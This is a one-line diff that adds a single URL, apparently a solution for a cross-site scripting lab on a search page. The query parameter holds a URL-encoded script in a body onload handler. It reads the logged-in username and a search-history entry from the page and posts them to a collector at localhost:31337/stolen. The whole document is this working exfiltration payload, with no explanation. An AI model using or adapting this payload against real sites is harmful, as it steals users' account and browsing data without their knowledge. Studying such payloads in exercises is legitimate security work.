@@ -1,0 +1,1 @@
+https://elecos432.org/search?xssdefense=1&q=<body+onload%3D"%24(document).ready(function()+{+let+username+%3D+%24('%23logged-in-user').html()%3B+let+recentSearch+%3D+%24(%24('.history-item')[1]).html()%3B+%24.post('http%3A%2F%2Flocalhost%3A31337%2Fstolen'%2C+{+username%3A+username%2C+search%3A+recentSearch+})%3B+})"><%2Fbody>
